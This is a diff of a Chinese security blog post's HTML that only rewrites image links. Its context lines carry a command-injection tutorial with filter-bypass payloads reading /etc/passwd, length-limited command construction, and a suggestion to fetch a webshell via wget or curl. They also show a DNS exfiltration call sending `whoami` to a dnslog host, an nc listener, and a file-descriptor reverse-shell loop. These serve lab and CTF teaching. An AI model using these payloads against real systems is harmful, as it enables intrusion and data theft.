@@ -621,8 +621,7 @@ fo*
 <span class=cp>?&gt;</span><span class=err> 
 </span></code></pre></div><p>这里没有对<code>ip</code>进行输入检测，所以我们可以使用<code>;cmd</code>的方式进行命令注入。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg loading=lazy>
 </a>
 </figure></p>
 <p>####Command Injection: medium</p>
@@ -658,8 +657,7 @@ fo*
 <span class=cp>?&gt;</span><span class=err> 
 </span></code></pre></div><p>这里仅仅只是增加了<code>&&</code>与<code>;</code>两个的过滤。然而我们仍然可以使用<code>|</code>来进行绕过。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg loading=lazy>
 </a>
 </figure></p>
 <p>####Command Injection: high</p>
@@ -702,8 +700,7 @@ fo*
 <span class=cp>?&gt;</span><span class=err> 
 </span></code></pre></div><p>这里仔细观察，其实<code>|</code>管道符这里有一个空格，所以我们<code>medium</code>的<code>payload</code>还可以继续使用，但是如果真的过滤了<code>|</code>怎么办呢。我们其实还可以抓包加入<code>%0a</code>换行符进行一个绕过。使用<code>127.0.0.1 %0acat /etc/passwd</code>进行绕过</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008189.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008189.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008189.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008189.jpg loading=lazy>
 </a>
 </figure></p>
 <h4 id=command-injection-impossible>Command Injection: impossible</h4>
@@ -804,8 +801,7 @@ flag<span class=o>{</span>xxx<span class=o>}</span>
 <p>在<code>url</code>的编码绕过</p>
 <p>这里我<code>fuzz</code>了一下，<code>Linux bash</code>可以使用<code>%20(space)</code>、<code>%09(tab)</code>、<code>%3c(&lt;)</code>以及<code>+</code>来绕过</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004461.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004461.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004461.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004461.jpg loading=lazy>
 </a>
 </figure></p>
 </li>
@@ -813,8 +809,7 @@ flag<span class=o>{</span>xxx<span class=o>}</span>
 <p>花括号拓展<code>{OS_COMMAND,ARGUMENT}</code></p>
 <p>在<code>Linux bash</code>中还可以使用<code>{cat,/etc/passwd}</code>来绕过</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009158.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009158.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009158.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009158.jpg loading=lazy>
 </a>
 </figure></p>
 </li>
@@ -908,8 +903,7 @@ $ <span class=nb>echo</span> <span class=nv>$PATH</span><span class=p>|</span> c
 <h4 id=短命令执行>短命令执行</h4>
 <p>首先按照前面的<code>></code>的用法，我们可以知道有标准输出可以输出到文件，所以</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007866.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007866.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007866.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007866.jpg loading=lazy>
 </a>
 </figure></p>
 <p>这里我们有两种构造方式:</p>
@@ -923,16 +917,14 @@ $ <span class=nb>echo</span> <span class=nv>$PATH</span><span class=p>|</span> c
 </code></pre></div></li>
 </ol>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008039.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008039.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008039.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008039.jpg loading=lazy>
 </a>
 </figure></p>
 <ol start=2>
 <li>使用<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来转义后一个<code>\</code>的。这里需要考虑时间顺序，需要逆序来创建文件。</li>
 </ol>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004356.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004356.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004356.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004356.jpg loading=lazy>
 </a>
 </figure></p>
 <h4 id=example-1七字绕过>Example 1 七字绕过</h4>
@@ -1002,8 +994,7 @@ $ <span class=nb>echo</span> <span class=nv>$PATH</span><span class=p>|</span> c
 </code></pre></div><p>这里需要我们注意的是<code>cmd &lt;= 5</code>，所以我们就不能在使用<code>ls -t>a</code>。</p>
 <p>但是我们还是可以通过比较巧妙的构造来实现<code>ls -t>a</code>这么一个操作的。可以先通过把<code>ls -t>a</code>这样拆分成几段写入到<code>_</code>文件存放。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008919.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008919.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008919.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008919.jpg loading=lazy>
 </a>
 </figure></p>
 <p>从图中我们就可以看到<code>_</code>里面的内容，第一行无效命令，2-5行因为末尾有<code>\</code>连接字符的存在所以可以连接字符串形成<code>ls -t>g</code>，最后一行执行<code>ls</code>。所以<code>sh _</code>我们可以得到当前目录<code>ls -t>g</code>的效果。达到与<code>Example 1</code>一致的效果，其他步骤与<code>Example 1</code>类似，就不再赘述了。下面给出<code>Orange</code>的<code>exp</code></p>
@@ -1069,38 +1060,32 @@ $ <span class=nb>echo</span> <span class=nv>$PATH</span><span class=p>|</span> c
 <span class=cp>?&gt;</span><span class=err>
 </span></code></pre></div><p>这题相比之前又难了一点，这次是<code>cmd &lt;= 4</code>，但是原理还是一样的。我们要处理的问题还是<code>ls -t>g</code>这么一个问题。然后因为长度限制，如果我们还用<code>\\</code>作为字符串连接的话，只剩下两个字符，加上最开始必须要用<code>></code>创建文件，所以只剩下一个可控字符。所以碰到需要转义空格这种地方例如<code>Exmaple 2</code>中的<code>>\ \\</code>这里就不能再使用了。但是我们这里再提一个<code>trick</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007665.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007665.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007665.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007665.jpg loading=lazy>
 </a>
 </figure></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005128.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005128.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005128.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005128.jpg loading=lazy>
 </a>
 </figure></p>
 <p><code>*</code> 相当于<code>$(dir *)</code>,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入。例如：</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009411.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009411.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009411.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009411.jpg loading=lazy>
 </a>
 </figure></p>
 <p>所以回到题目，如果按照顺序去创建文件，我们会发现如果直接用<code>*</code>去执行的话，发现并不可以，因为按照<code>dir</code>的文件排序，<code>-t</code>也是排在最前面。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008096.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008096.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008096.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008096.jpg loading=lazy>
 </a>
 </figure></p>
 <p>所以我们还需要参考一下<code>alphabetical</code>来排序，这里就不要用<code>Docker</code>来做了，因为<code>busybox</code>里面一些东西还是跟真实环境优点区别的。<figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000746.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000746.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000746.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000746.jpg loading=lazy>
 </a>
 </figure></p>
 <p>所以如果我们需要运用<code>-</code>字符的话，他会排在最前面，这里就比较坑了。所以我们需要想个办法把<code>-t</code>置于后面。</p>
 <p>这里我们可以使用<code>t-</code>这种逆序的模式把<code>t</code>放到前面来，就可以比较正常的排序了。</p>
 <p>逆序的命令我们可以用<code>rev</code>来实现，另外我们还需要一个字母比较靠前的命令来展示当前目录，我们可以采用<code>dir</code>来展示当前目录，同时<code>d</code>字母也比较靠前，不要像<code>ls</code>特别考虑排序的问题。所以我们大概可以通过这么一个形式去构造<code>ls -t>g</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008113.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008113.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008113.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008113.jpg loading=lazy>
 </a>
 </figure></p>
 <p>这里可能有几个让大家比较疑惑的地方，比如为什么是<code>>ht-</code>，个人理解是因为<code>ls</code>逆序是<code>sl</code>，<code>s</code>是排在<code>t</code>前的，如果不加<code>h</code>，<code>t-</code>会在<code>sl</code>之后，而且<code>ls -th</code>与<code>ls -t</code>效果是一样的，然后我们再找一个<code>h</code>之前的字母做输出文件就可以了。还有一个地方就是<code>*v>x</code>，之前我们讲过了通配符以及<code>*</code>的作用，这里<code>*v</code>就相当于<code>$(dir *v)>x</code>，<code>dir *v</code>返回的就是结尾为<code>v</code>的文件，这里就是<code>rev</code>与<code>v</code>两个文件，如果只有相当于先把<code>v</code>文件内容进行逆序，而后再输入到<code>x</code>文件，这样整个<code>ls -t>g</code>的命令拼凑就完成了，接着方法就有很多种了，比较简单的就是直接<code>wget</code>或者<code>curl</code>一个<code>webshell</code>到服务器上就好了，就不再赘述了。</p>
@@ -1163,13 +1148,11 @@ $ <span class=nb>echo</span> <span class=nv>$PATH</span><span class=p>|</span> c
 <pre tabindex=0><code>curl &quot;http://testhash.test.dnslog.link/?`whoami`&quot;
 </code></pre><p>这个用起来比较简单，直接去查看对应的记录就好了。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005118.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005118.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005118.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005118.jpg loading=lazy>
 </a>
 </figure></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000939.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000939.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000939.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000939.jpg loading=lazy>
 </a>
 </figure></p>
 <p>有时候你需要编码想要读出来的内容，这样才不会由于一些空格或者什么其他字符导致读不完整数据。</p>
@@ -1181,13 +1164,11 @@ to offload file contents.
 </code></pre></div><p>服务端：</p>
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>nc -l -n -vv -p <span class=m>53</span> -u -k<span class=o>(</span>如果不支持-k也可以不用-k<span class=o>)</span>
 </code></pre></div><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004044.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004044.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004044.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004044.jpg loading=lazy>
 </a>
 </figure></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008182.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008182.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008182.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008182.jpg loading=lazy>
 </a>
 </figure></p>
 <p>Same:</p>
@@ -1341,13 +1322,11 @@ yes
 
 $ cat &lt;<span class=p>&amp;</span><span class=m>5</span> <span class=p>|</span> <span class=k>while</span> <span class=nb>read</span> line<span class=p>;</span> <span class=k>do</span> <span class=nv>$line</span> 2&gt;<span class=p>&amp;</span><span class=m>5</span> &gt;<span class=p>&amp;</span>5<span class=p>;</span> <span class=k>done</span>
 </code></pre></div><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000724.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000724.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000724.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000724.jpg loading=lazy>
 </a>
 </figure></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003384.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003384.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003384.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003384.jpg loading=lazy>
 </a>
 </figure></p>
 <p><code>nc</code>方式</p>
